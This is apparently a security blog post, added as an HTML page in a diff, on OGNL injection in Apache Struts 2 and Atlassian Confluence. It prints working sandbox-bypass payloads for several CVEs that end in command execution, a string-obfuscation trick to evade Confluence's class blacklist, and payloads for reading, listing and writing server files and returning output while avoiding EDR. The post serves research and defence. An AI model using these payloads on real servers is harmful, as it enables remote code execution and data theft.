@@ -1,0 +1,642 @@
+<!DOCTYPE html>
+<html lang="en">
+
+  <head>
+  <meta charset="utf-8">
+  <meta http-equiv="X-UA-Compatible" content="IE=edge">
+  <meta name="viewport" content="width=device-width, initial-scale=1">
+
+  
+  
+  
+  <title>The hell of OGNL injection revisited</title>
+  <meta name="description" content="OGNL stands for Object-Graph Navigation Language and it’s a widely used expression language in the Java web world. Its main ability is to provide advanced functionalities on web template rendering, specially on Struts 2 framework and Atlassian WebWork.">
+  
+
+  <link rel="stylesheet" href="/assets/main.css">
+  <link rel="canonical" href="http://localhost:4000/2022/07/09/ognl-injection-snippets/">
+  
+  
+  <link rel="alternate" type="application/rss+xml" title="Hans Topo Blog" href="http://localhost:4000/feed.xml">
+
+  
+
+  
+  <meta name="twitter:card" content="summary">
+  <meta name="twitter:site" content="_dreadlocked">
+  <meta name="twitter:title" content="The hell of OGNL injection revisited">
+  <meta name="twitter:description" content="OGNL stands for Object-Graph Navigation Language and it’s a widely used expression language in the Java web world. Its main ability is to provide advanced functionalities on web template rendering,...">
+  
+    <meta name="twitter:creator" content="_dreadlocked">
+  
+  
+
+  <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+<link href="https://fonts.googleapis.com/css?family=Bitter:400,400i,700" rel="stylesheet">
+
+  
+
+</head>
+
+
+  <body>
+
+    <header class="site-header">
+
+  <div class="wrapper">
+
+    <a class="site-title" href="/">Hans Topo Blog</a>
+
+    <nav class="site-nav">
+      
+        
+        <a class="page-link" href="/about/">About</a>
+      
+        
+        <a class="page-link" href="/archives/">Archives</a>
+      
+        
+        <a class="page-link" href="https://github.com/yous/whiteglass">GitHub</a>
+      
+    </nav>
+
+  </div>
+
+</header>
+
+
+    <main class="page-content" aria-label="Content">
+      <div class="wrapper">
+        <article class="post" itemscope itemtype="http://schema.org/BlogPosting">
+
+  <header class="post-header">
+    
+      <h1 class="post-title" itemprop="name headline">The hell of OGNL injection revisited</h1>
+    
+    <p class="post-meta"><time datetime="2022-07-09T13:00:00+02:00" itemprop="datePublished">Jul 9, 2022</time> •
+  
+    
+    
+      
+    
+      
+    
+      
+    
+      
+    
+      
+    
+      
+    
+      
+    
+      
+    
+      
+    
+      
+    
+      
+    
+      
+        <a href="/categories/web/">web</a>,
+      
+    
+      
+    
+      
+    
+      
+    
+      
+    
+      
+    
+      
+    
+      
+    
+      
+    
+      
+    
+  
+    
+    
+      
+    
+      
+    
+      
+    
+      
+    
+      
+    
+      
+    
+      
+    
+      
+    
+      
+    
+      
+    
+      
+    
+      
+    
+      
+    
+      
+    
+      
+    
+      
+    
+      
+    
+      
+    
+      
+        <a href="/categories/struts/">struts</a>,
+      
+    
+      
+    
+      
+    
+  
+    
+    
+      
+    
+      
+    
+      
+    
+      
+    
+      
+    
+      
+    
+      
+    
+      
+    
+      
+    
+      
+    
+      
+    
+      
+    
+      
+    
+      
+    
+      
+    
+      
+    
+      
+    
+      
+    
+      
+    
+      
+        <a href="/categories/ognl/">ognl</a>,
+      
+    
+      
+    
+  
+    
+    
+      
+    
+      
+    
+      
+    
+      
+    
+      
+    
+      
+    
+      
+    
+      
+    
+      
+    
+      
+    
+      
+    
+      
+    
+      
+    
+      
+    
+      
+    
+      
+    
+      
+    
+      
+    
+      
+    
+      
+    
+      
+        <a href="/categories/confluence/">confluence</a>
+      
+    
+  
+
+
+
+</p>
+  </header>
+
+  <div class="post-content" itemprop="articleBody">
+    <p>OGNL stands for Object-Graph Navigation Language and it’s a widely used expression language in the Java web world. Its main ability is to provide advanced functionalities on web template rendering, specially on Struts 2 framework and Atlassian WebWork.</p>
+
+<p>OGNL provides access to Java core libraries and can perform code execution on template rendering for web applications, this of course implies certain security concerns, because if a user-supplied input is evaluated as OGNL, it will be able to execute dangerous functions on the server-side.</p>
+
+<p>This post pretends to serve as a guide to better understand how OGNL works, and how frameworks put restrictions in place (and fail) to avoid straightforward OGNL injection explotation by sandboxing its capabilities.</p>
+
+<h3 id="ognl-101">OGNL 101</h3>
+<p>It’s recommended to read the <a href="!https://struts.apache.org/tag-developers/ognl">OGNL introduction</a> and <a href="!https://struts.apache.org/tag-developers/ognl-basics">OGNL basics</a> manuals from the Struts project. In this article we will make a brief introduction to OGNL basics to understand how to create OGNL primitives for our injections.</p>
+
+<p>There are two main ways OGNL is evaluated, the first and most common way is through JSP files, inside Struts tags. The second, used mostly by framework internals is calling the OGNL expression parser using the OGNL java library.</p>
+
+<p>An OGNL expression insde a Struts tag on a JSP file looks as follows:</p>
+<div class="language-html highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nt">&lt;s:property</span> <span class="na">value=</span><span class="s">"%{obj.field}"</span><span class="nt">/&gt;</span>
+</code></pre></div></div>
+<p>In the case above, <code class="highlighter-rouge">%{obj.field}</code> is an OGNL expression, which access the <code class="highlighter-rouge">obj</code> object and its <code class="highlighter-rouge">field</code> atribute. But where is this object stored? How OGNL access this object through a JSP file? It uses something called The ValueStack.</p>
+
+<p>Didn’t you asked yourself why OGNL stands for Object-Graph Navigation Language? Well, that’s because OGNL uses a graph of objects that can be navigated, just like directories, but instead of folders, we have objects. The default tree is:</p>
+
+<div class="language-text highlighter-rouge"><div class="highlight"><pre class="highlight"><code>context map---|
+              |--application
+              |--session
+              |--value stack (root)
+              |--action (the current action)
+              |--request
+              |--parameters
+              |--attr (searches page, request, session, then application scopes)
+</code></pre></div></div>
+<p>The ValueStack is the default object to be accessed,  As its name says, it’s a stack, values are pushed and poped on the stack, but OGNL sees the ValueStack as a single object.</p>
+
+<p>To access other non-root objects (objects which aren’t on the ValueStack) we can use the “#” prefix, for example: <code class="highlighter-rouge">&lt;s:property value="#session['mySessionPropKey']"/&gt;</code>  or <code class="highlighter-rouge">&lt;s:property value="%{#session['mySessionPropKey']}"/&gt;</code> (they are equivalent, the %{} just forces the evaluation).</p>
+
+<h3 id="ognl-syntax">OGNL syntax.</h3>
+
+<p>OGNL isn’t like a programming language, it’s an expression language, and because of that it has a special syntax.</p>
+
+<p>OGNL expressions are written inside <code class="highlighter-rouge">%{}</code> string. And instead of new lines, the sub-expressions are wrapped inside parenthesis and then joined using <code class="highlighter-rouge">.</code>. For example:</p>
+
+<p><code class="highlighter-rouge">%{ (#a = 1).(#b = 2).(a+b) }</code> This will result in <code class="highlighter-rouge">3</code> as the last expression is taken as return value.</p>
+
+<h4 id="variable-declaration">Variable declaration.</h4>
+<p>As seen on the example above, to declare a variable in OGNL we can use the <code class="highlighter-rouge">#</code> prefix.</p>
+
+<p>Some examples:</p>
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>#a=1
+#a="abc"
+#a=true
+</code></pre></div></div>
+
+<h4 id="access-static-objects">Access static objects.</h4>
+
+<p>To access static functions of classes, OGNL provides the <code class="highlighter-rouge">@</code> prefix:
+<code class="highlighter-rouge">(#a = @java.lang.String@valueOf('test'))</code> will create an String object with ‘test’ string, note that as we are calling the static valueOf method, we need to use the <code class="highlighter-rouge">@</code>prefix both on the class name and the method name.</p>
+
+<h4 id="conditionals">Conditionals.</h4>
+
+<p>OGNL let you implement conditional branches using the ternary operator <code class="highlighter-rouge">?</code> as in many other languages.</p>
+
+<p><code class="highlighter-rouge">(#os = @java.lang.System@getProperty('os.name')).(#os == 'Linux' ? &lt;true&gt; : &lt;false&gt;)</code></p>
+
+<h4 id="loops">Loops.</h4>
+<p>There’s not so much examples about OGNL loops on the internet. To perform loops on OGNL we use the brackets syntax.</p>
+
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>(#i=0).
+(#array.{
+    (#element=#array[#i]).
+    (&lt;do something with the element&gt;).
+    (#i=#i+1)
+})
+</code></pre></div></div>
+<p>I’ve splitted the lines to better understand and read the snippet, but in reality they should be written without new lines.</p>
+
+<p>As you may see, the loop will execute inside the <code class="highlighter-rouge">#array.{ ... }</code> element, and will iterate <strong>for each</strong> <code class="highlighter-rouge">#array</code> element. We declared an index <code class="highlighter-rouge">#i</code> to track which element of the array we are accessing.</p>
+
+<p>Pretty ugly way to loop over arrays, I know.</p>
+
+<h4 id="class-instantiation">Class instantiation.</h4>
+<p>You can also instantiate Java classes using its fully qualified name, i.e. <code class="highlighter-rouge">java.lang.String</code> or <code class="highlighter-rouge">java.io.File</code> etc, as OGNL can’t resolve by itself the default java namespaces.</p>
+
+<p>Let’s explain it better some expression snippets.</p>
+
+<p><code class="highlighter-rouge">%{(#a = new java.lang.String('test')}</code></p>
+
+<p>or</p>
+
+<p><code class="highlighter-rouge">%{(#a = @java.lang.String@valueOf('test'))}</code> to call static methods.</p>
+
+<h4 id="inline-hash-instantiation">Inline hash instantiation.</h4>
+<p>OGNL allows to instantiate and fill a hash map using a curly braces notation, for example:</p>
+
+<p><code class="highlighter-rouge">%{(#a = #@java.util.LinkedHashMap@{'foo':'value'})}</code></p>
+
+<h3 id="when-ognl-injection-occurs">When OGNL injection occurs?</h3>
+
+<p>OGNL injection occurs when the framework parses untrusted user-supplied data as OGNL. Unlike how it happens on template injection, OGNL injections doesn’t need to be reflected in the output, and usually are not fault of the application developer, but the framework itself.</p>
+
+<p>Let’s see some real life examples to better understand where this injections occurs. S2-045 is a great example of how OGNL injection can occur without beign reflected on the output.</p>
+
+<p>S2-045 refers to a vulnerability in the <code class="highlighter-rouge">MultiPartRequestWrapper</code> method. When and error occurs parsing the <code class="highlighter-rouge">Content-Type</code> header, the error handling mechanism of Struts ends up passing the string inside Content-Type header to <code class="highlighter-rouge">TextParseUtil.translateVariables()</code> method, which evaluates the string as OGNL when the string is inside <code class="highlighter-rouge">%{}</code>.</p>
+
+<p>Two main functions ends-up parsing OGNL <code class="highlighter-rouge">TextParseUtil.findValue()</code> and <code class="highlighter-rouge">TextParseUtil.translateVariables()</code>, many vulnerabilities occur because user-supplied strings ends up as parameters of this functions.</p>
+
+<p>Another fast and easy way for the developer to identify this kind of injections is to test for <code class="highlighter-rouge">%{7*7}</code> on their application input and see if the reflected result is <code class="highlighter-rouge">49</code>.</p>
+
+<h3 id="ognl-sandbox-restrictions-in-struts-2">OGNL sandbox restrictions in Struts 2.</h3>
+
+<p>Struts limits the functionality of OGNL to prevent Java classes from beign instantiated. OGNL uses the attribute <code class="highlighter-rouge">#_memberAccess</code> from the <code class="highlighter-rouge">SecurityMemberAccess</code> object to prevent many objects to load. By default it’s attribute <code class="highlighter-rouge">allowStaticMethodAccess</code> is set to false, this prevents access to static, protected and private methods.</p>
+
+<p>OGNL also provides a blacklist of classes that can be loaded, <code class="highlighter-rouge">excludedClasses</code>, <code class="highlighter-rouge">excludedPackageNames</code> and <code class="highlighter-rouge">excludedPackageNamePatterns</code></p>
+
+<h4 id="bypass-1-before-struts-2314">Bypass 1. Before Struts 2.3.14.</h4>
+<p>Before Struts 2.3.20, the <code class="highlighter-rouge">@_memberAccess</code> attribute was accesible, so you could simply stablish the value of <code class="highlighter-rouge">allowStaticMethodAccess</code> to <code class="highlighter-rouge">true</code> like this:</p>
+
+<p><code class="highlighter-rouge">%{(#_memberAccess['allowStaticMethodAccess']=true).(&lt;whatever you want to do&gt;)}</code></p>
+
+<p>Struts team decided to make <code class="highlighter-rouge">allowStaticMethodAccess</code> final, to prevent it’s value from beign changed on runtime.</p>
+
+<h4 id="bypass-2-before-struts-2320">Bypass 2. Before Struts 2.3.20.</h4>
+<p>Now, more restrictions are added, the main restrictions are:</p>
+<ul>
+  <li>No constructor calls allowed.</li>
+  <li>Excluded classes and packages blacklist is added. <a href="https://github.com/apache/struts/blob/master/core/src/main/resources/struts-default.xml#L39">(Check it)</a></li>
+</ul>
+
+<p>All this changes affects the <code class="highlighter-rouge">SecurityMemberAccess</code> object, but there’s another weaker version of this security object, the <code class="highlighter-rouge">DefaultMemberAccess</code> <a href="https://github.com/jkuhnert/ognl/blob/OGNL_3_1_15/src/java/ognl/OgnlContext.java#L59">(check it)</a> object, which doesn’t have any of this restrictions. What OGNL exploits for this Struts version does is to asign <code class="highlighter-rouge">#_memberAccess</code> to <code class="highlighter-rouge">@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS</code> to bypass the restrictions.</p>
+
+<p><code class="highlighter-rouge">%{(#_memberAccess=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(&lt;whatever you want to do&gt;)}</code></p>
+
+<h4 id="bypass-3-before-struts-2329">Bypass 3. Before Struts 2.3.29.</h4>
+<p>Things start to get hard. In this version, <code class="highlighter-rouge">#_memberAccess</code> is no longer available, also <code class="highlighter-rouge">MemberAcces</code> and <code class="highlighter-rouge">DefaultMemberAccess</code> are included on the blacklist.</p>
+
+<p>So, now what? Let’s take a look at the on the wild found exploit for this Struts version.</p>
+
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>(#container=#context['com.opensymphony.xwork2.ActionContext.container']).
+(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).
+(#ognlUtil.excludedClasses.clear()).
+(#ognlUtil.excludedPackageNames.clear()).
+(#context.setMemberAccess(@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS)).
+(@java.lang.Runtime@getRuntime().exec('&lt;whatever to execute&gt;'))
+</code></pre></div></div>
+
+<p>As you can see, <code class="highlighter-rouge">#context</code> still accessible, so we can get an instance of <code class="highlighter-rouge">OgnlUtil</code> which is not blacklisted and clear the excludedClasses and excludedPackages list. After that using the setter method, we can set the member access to the <code class="highlighter-rouge">DefaultMemberAccess</code>, because excludedClasses is cleared.</p>
+
+<h4 id="bypass-4-before-struts-2516">Bypass 4. Before Struts 2.5.16.</h4>
+<p>Researcher Man Yue Mo, from Github Security team, found a way to bypass new security restrictions to exploit CVE-2018-11776 in Struts.</p>
+
+<p>Access to <code class="highlighter-rouge">#context</code> is not available anymore, so we need to find a way to access <code class="highlighter-rouge">ActionContext</code> class.</p>
+
+<p>Man Yue Mo found a way to bypass the <code class="highlighter-rouge">#context</code> access restriction using two requests, the first, access <code class="highlighter-rouge">#context</code> using <code class="highlighter-rouge">#attr['struts.ValueStack'].context</code> and clears <code class="highlighter-rouge">excludedClasses</code> and <code class="highlighter-rouge">excludedPackages</code>.</p>
+
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>(#context=#attr['struts.valueStack'].context).
+(#container=#context['com.opensymphony.xwork2.ActionContext.container']).
+(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).
+(#ognlUtil.setExcludedClasses('')).
+(#ognlUtil.setExcludedPackageNames(''))
+</code></pre></div></div>
+
+<p>And the second request, sets <code class="highlighter-rouge">#_memberAccess</code> to <code class="highlighter-rouge">DefaultMemberAccess</code> as always.</p>
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>(#context=#attr['struts.valueStack'].context).
+(#context.setMemberAccess(@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS)).
+(@java.lang.Runtime@getRuntime().exec('&lt;whatever to execute&gt;'))
+</code></pre></div></div>
+
+<h4 id="bypass-5-before-struts-2522-bypass-of-s2-059">Bypass 5. Before Struts 2.5.22. (Bypass of S2-059)</h4>
+<p>CVE-2020-17530 exploits a double-evaluation vulnerability on Struts, similar to the previous one. This vulnerability was found by the great Alvaro Muñoz and Masato Anzai, they didn’t published a bypass for the S2-059 restrictions, but an exploit was found on the wild.</p>
+
+<p>Access to <code class="highlighter-rouge">#context</code> using the <code class="highlighter-rouge">#attr['struts.valueStack']</code> is no longer available, so an alternative way to access <code class="highlighter-rouge">#context</code> need to be found. Also <code class="highlighter-rouge">com.opensymphony.xwork2.ActionContext</code> is now on the blacklist of <code class="highlighter-rouge">excludedClasses</code>.</p>
+
+<p>The exploit is dissected for a better reading experience.</p>
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>(#instancemanager=#application["org.apache.tomcat.InstanceManager"]).
+(#stack=#attr["com.opensymphony.xwork2.util.ValueStack.ValueStack"]).
+
+(#bean=#instancemanager.newInstance("org.apache.commons.collections.BeanMap")).
+(#bean.setBean(#stack)).
+
+(#context=#bean.get("context")).
+(#bean.setBean(#context)).
+
+(#macc=#bean.get("memberAccess")).
+(#bean.setBean(#macc)).
+
+(#emptyset=#instancemanager.newInstance("java.util.HashSet")).
+(#bean.put("excludedClasses",#emptyset)).
+(#bean.put("excludedPackageNames",#emptyset)).
+
+(#arglist=#instancemanager.newInstance("java.util.ArrayList")).
+(#arglist.add("&lt;whatever to execute&gt;")).
+
+(#execute=#instancemanager.newInstance("freemarker.template.utility.Execute")).
+(#execute.exec(#arglist))
+</code></pre></div></div>
+
+<p>As you can see, this exploit depends on Tomcat to be the server where the application is running on (in rare cases Struts applications aren’t run over Tomcat).</p>
+
+<p>It uses the <code class="highlighter-rouge">InstanceManager</code> from Tomcat to call constructors thus bypassing the constructors restriction.</p>
+
+<p>It cleverly uses <code class="highlighter-rouge">BeanMap</code> class from apache commons collection for setting and getting the key classes need to bypadd Struts security restrictions, <code class="highlighter-rouge">context</code>, <code class="highlighter-rouge">#_memberAccess</code>, <code class="highlighter-rouge">
+excludedClasses</code> and <code class="highlighter-rouge">excludedPackageNames</code>.</p>
+
+<p>Finally it uses the well-known <code class="highlighter-rouge">freemarker.template.utility.Execute</code> class to execute the commands.</p>
+
+<h4 id="bypass-6-before-struts-2529-bypass-of-s2-061">Bypass 6. Before Struts 2.5.29. (Bypass of S2-061)</h4>
+<p>CVE-2021-31805 exists due to an incomplete fix of CVE-2020-17530, so the vulnerability is esentially the same, a double evaluation bug.</p>
+
+<p>Things start to get really confusing. An exploit found in the wild bypasses the restrictions in place when fixing S2-061, let’s take a look at it (the exploit is dissected and simplified for a better understanding).</p>
+
+<p>Now, <code class="highlighter-rouge">org.apache.tomcat.*</code> and many other libraries are included on the <code class="highlighter-rouge">excludedPackageNames</code>, so access to <code class="highlighter-rouge">"org.apache.tomcat.InstanceManager</code> is not available anymore.</p>
+
+<p>A <a href="https://mc0wn.blogspot.com/2021/04/exploiting-struts-rce-on-2526.html">security researcher</a> found that OGNL allows to create and populate hash maps by using curly braces at the end of the class name, so there’s no need to first call <code class="highlighter-rouge">InstanceManager</code> to instantiate a <code class="highlighter-rouge">BeanMap</code> as you can just use <code class="highlighter-rouge">BeanMap@{}</code> and OGNL will instantiate the class and populate the map with empty values for you.</p>
+
+<p>There’s no restrictions for accessing <code class="highlighter-rouge">org.apache.commons.collections.*</code> so the bypass is clear.</p>
+
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>(#request.map=#@org.apache.commons.collections.BeanMap@{})
+(#request.map.setBean(#request.get('struts.valueStack')))
+
+(#request.map2=#@org.apache.commons.collections.BeanMap@{})
+(#request.map2.setBean(#request.get('map').get('context')))
+
+(#request.map3=#@org.apache.commons.collections.BeanMap@{})
+(#request.map3.setBean(#request.get('map2').get('memberAccess')))
+
+(#request.get('map3').put('excludedPackageNames',#@org.apache.commons.collections.BeanMap@{}.keySet())) 
+(#request.get('map3').put('excludedClasses',#@org.apache.commons.collections.BeanMap@{}.keySet()))
+
+(#application.get('org.apache.tomcat.InstanceManager').newInstance('freemarker.template.utility.Execute').exec(&lt;whatever to execute&gt;))
+</code></pre></div></div>
+
+<p>The first two lines creates a <code class="highlighter-rouge">BeanMap</code> using the curly braces technique, and stores it into <code class="highlighter-rouge">#request.map</code>, you can also use <code class="highlighter-rouge">#application.map</code> or <code class="highlighter-rouge">#attr.map</code>, whatever you want. Then, gets the <code class="highlighter-rouge">ValueStack</code> from <code class="highlighter-rouge">struts.valueStack</code> as seen on previous payloads, setting the and sets the <code class="highlighter-rouge">BeanMap</code> created earlier to the <code class="highlighter-rouge">ValueStack</code> instance.</p>
+
+<p>Then it creates another two other maps, <code class="highlighter-rouge">map2</code> and <code class="highlighter-rouge">map3</code>  and repeats the process, this time to get <code class="highlighter-rouge">#context</code> and <code class="highlighter-rouge">#_memberAccess</code> <strong>but</strong> through the first <code class="highlighter-rouge">BeanMap</code> created.</p>
+
+<p>The following steps is to set <code class="highlighter-rouge">excludedPackageName</code> and <code class="highlighter-rouge">excludedClasses</code> to an empty set as seen on previous bypasses.</p>
+
+<p>And finally, <code class="highlighter-rouge">org.apache.tomcat.InstanceManager</code> is accesible again. Using the well-known <code class="highlighter-rouge">freemarker.template.utility.Execute</code> class, we can now execute commands.</p>
+
+<h3 id="ognl-in-the-atlassian-webwork-framework">OGNL in the Atlassian WebWork framework.</h3>
+<p>Atlassian products are also affected regularly by OGNL injection vulnerabilities. Particularly, the Confluence server usually get hit by OGNL injections.</p>
+
+<p>Atlassian uses a function named <code class="highlighter-rouge">SafeExpressionUtil.isSafeExpressionInternal()</code> before every OGNL parsing.</p>
+
+<p>Researcher Quang Vo did a <a href="https://mr-r3bot.github.io/research/2022/06/06/Confluence-Preauth-RCE-2022.html">great research</a> on how to bypass <code class="highlighter-rouge">isSafeExpressionInternal</code> security method.</p>
+
+<p>As Struts does, Atlassian Confluence has an excluded classes blacklist:</p>
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>sun.misc.Unsafe
+classLoader
+java.lang.System
+java.lang.ThreadGroup
+com.opensymphony.xwork.ActionContect
+java.lang.Compiler
+com.attlassian.applinks.api.ApplicationLinkRequestFactory
+java.lang.Thread
+com.atlassian.core.util.ClassLoaderUtils
+java.lang.ProcessBuilder
+java.lang.InheritableThreadLocal
+com.atlassian.core.util.ClassHelper
+class
+java.lang.Shutdown
+java.lang.ThreadLocal
+java.lang.Process
+java.lang.Package
+org.apache.tomcat.InstanceManager
+java.lang.Runtime
+javax.script.ScriptEngineManager
+javax.persistence.EntityManager
+org.springframework.context.ApplicationContext
+java.lang.SecurityManager
+java.lang.Object
+java.lang.Class
+java.lang.RuntimePermission
+javax.servlet.ServletContext
+java.lang.ClassLoader
+</code></pre></div></div>
+
+<p>Atlassian dissects the OGNL payload into substrings using an AST parser but Java has the ability to load a class using a string of it’s class name, this is called reflection. Reflection can be done using <code class="highlighter-rouge">Class.forName(&lt;class name&gt;)</code> method.</p>
+
+<p>As you may guess, you can do something like <code class="highlighter-rouge">Class.forName("java.lang.Run" + "time")</code>. But turns out that concatenation doesn’t work when <code class="highlighter-rouge">Ognl.parseExpression()</code> is called with our expression.</p>
+
+<p>So instead of concatenating using the <code class="highlighter-rouge">+</code> operator, we can use the <code class="highlighter-rouge">concat()</code> function mixed with <code class="highlighter-rouge">charAt()</code> and <code class="highlighter-rouge">toChars()</code> methods.</p>
+
+<p>The following payload is the equivalent to write <code class="highlighter-rouge">java.lang.Runtime</code>:</p>
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>true.toString().charAt(0).toChars(106)[0].toString().concat(true.toString().charAt(0).toChars(97)[0].toString()).concat(true.toString().charAt(0).toChars(118)[0].toString()).concat(true.toString().charAt(0).toChars(97)[0].toString()).concat(true.toString().charAt(0).toChars(46)[0].toString()).concat(true.toString().charAt(0).toChars(108)[0].toString()).concat(true.toString().charAt(0).toChars(97)[0].toString()).concat(true.toString().charAt(0).toChars(110)[0].toString()).concat(true.toString().charAt(0).toChars(103)[0].toString()).concat(true.toString().charAt(0).toChars(46)[0].toString()).concat(true.toString().charAt(0).toChars(82)[0].toString()).concat(true.toString().charAt(0).toChars(117)[0].toString()).concat(true.toString().charAt(0).toChars(110)[0].toString()).concat(true.toString().charAt(0).toChars(116)[0].toString()).concat(true.toString().charAt(0).toChars(105)[0].toString()).concat(true.toString().charAt(0).toChars(109)[0].toString()).concat(true.toString().charAt(0).toChars(101)[0].toString())
+</code></pre></div></div>
+
+<p>This trick is also mentioned in 2020 by the researcher Will Boucher in <a href="https://pulsesecurity.co.nz/articles/EL-Injection-WAF-Bypass">this blog post</a> on how to bypass WAF when there’s an EL Injection.</p>
+
+<h3 id="http-output-of-executed-commands-in-ognl">HTTP output of executed commands in OGNL.</h3>
+<p>One thing those bypasses and payloads doesn’t mention is how to get the output of the commands as HTTP output when the result of the OGNL evaluation is not reflected.</p>
+
+<p>Here I describe two ways, the first to get the output of a <code class="highlighter-rouge">String</code> via HTTP output:</p>
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>(#output=#o).(#strIs=new java.io.ByteArrayInputStream(@java.lang.String@valueOf(#output).getBytes())).(#ros=(@org.apache.struts2.ServletActionContext@getResponse().getOutputStream())).(@org.apache.commons.io.IOUtils@copy(#strIs,#ros)).(#ros.flush())
+</code></pre></div></div>
+
+<p>And a second one for getting the HTTP output of a <code class="highlighter-rouge">ByteArray</code> stream, to download or read a binary file.</p>
+
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>(#output=#o).(#strIs=new java.io.ByteArrayInputStream(#output)).(#ros=(@org.apache.struts2.ServletActionContext@getResponse().getOutputStream())).(@org.apache.commons.io.IOUtils@copy(#strIs,#ros)).(#ros.flush())
+</code></pre></div></div>
+
+<h3 id="alternative-ognl-primitives-to-avoid-executing-commands">Alternative OGNL primitives to avoid executing commands.</h3>
+
+<p>Both <code class="highlighter-rouge">ProcessBuilder</code> and <code class="highlighter-rouge">freemarker.template.utility.Execute</code> ends up creating a subprocess of <code class="highlighter-rouge">cmd.exe</code> or <code class="highlighter-rouge">/bin/sh</code> and calling the corresponding command to get it’s output. This behavior could be detected by EDR/XDR software as pontentially malicious behavior.</p>
+
+<h4 id="list-files-ls">List files (ls)</h4>
+<p>To list files as <code class="highlighter-rouge">ls</code> command does, we need to use an OGNL loop over to read the desired directory.</p>
+
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>(#fol = new java.io.File('#{ls_path}')).(#fileNames = #fol.list()).(#finalStr=@java.lang.String@valueOf('')).(#i=0).(#fileNames.{(#c=#fileNames[#i]).(#i=#i+1).(#finalStr=#finalStr.concat(#c+\"\\n\"))}).(#o=#finalStr)
+</code></pre></div></div>
+
+<p>The file names are stored in <code class="highlighter-rouge">#o</code>, then use the HTTP output primitive to print them over HTTP.</p>
+
+<h4 id="read-files-cat">Read files (cat)</h4>
+<p>Get the file as <code class="highlighter-rouge">ByteArray</code>:</p>
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>(#f=new java.io.File('&lt;file_to_read&gt;')).(#o=@org.apache.commons.io.FileUtils@readFileToByteArray(#f))
+</code></pre></div></div>
+
+<p>Then use the <code class="highlighter-rouge">ByteArray</code> HTTP output primitive to output the file.</p>
+
+<h4 id="get-current-directory-pwd">Get current directory (pwd)</h4>
+<p>This is a simple one:</p>
+
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>(#pwd = new java.io.File('.').getCanonicalPath()).(#o=#pwd)
+</code></pre></div></div>
+
+<h4 id="write-file-using-a-custom-header">Write file, using a custom header.</h4>
+<p>This payload will get the file data stored in a custom header named <code class="highlighter-rouge">Data</code> and write it to the desired file path and name.</p>
+
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>(#data=@org.apache.struts2.ServletActionContext@getRequest().getHeader('Data')).(#f=new java.io.FileWriter('&lt;path to write&gt;',true)).(#f.write(#data)).(#f.close())
+</code></pre></div></div>
+
+<p>How about using Base64 to decode the <code class="highlighter-rouge">Data</code> header and allow writing binary data? This is an exercise to the reader!</p>
+
+<h3 id="references">References</h3>
+<ul>
+  <li>CVE-2017-5638: https://medium.com/@lucideus/exploiting-apache-struts2-cve-2017-5638-lucideus-research-83adb9490ede</li>
+  <li>(S2-057) CVE-2018-11776: https://isecurity.huawei.com/sec/web/viewBlog.do?id=1857</li>
+  <li>https://securitylab.github.com/research/apache-struts-CVE-2018-11776/</li>
+  <li>(S2-059) CVE-2019-0230 https://www.tenable.com/blog/cve-2019-0230-apache-struts-potential-remote-code-execution-vulnerability</li>
+  <li>(S2-061) CVE-2020-17530: - https://blog.qualys.com/vulnerabilities-threat-research/2021/09/21/apache-struts-2-double-ognl-evaluation-vulnerability-cve-2020-17530</li>
+  <li>https://securitylab.github.com/research/ognl-injection-apache-struts/</li>
+  <li>https://securitylab.github.com/research/apache-struts-double-evaluation/</li>
+  <li>https://securitylab.github.com/research/ognl-apache-struts-exploit-CVE-2018-11776/</li>
+  <li>https://mr-r3bot.github.io/research/2022/06/06/Confluence-Preauth-RCE-2022.html</li>
+</ul>
+
+  </div>
+
+  
+
+</article>
+
+      </div>
+    </main>
+
+    <footer class="site-footer">
+
+  <div class="wrapper">
+
+    <p>
+      
+
+&copy;  - Powered by <a href="https://jekyllrb.com">Jekyll</a> &amp; <a href="https://github.com/yous/whiteglass">whiteglass</a> - Subscribe via <a href="http://localhost:4000/feed.xml">RSS</a>
+
+    </p>
+
+  </div>
+
+</footer>
+
+
+  </body>
+
+</html>
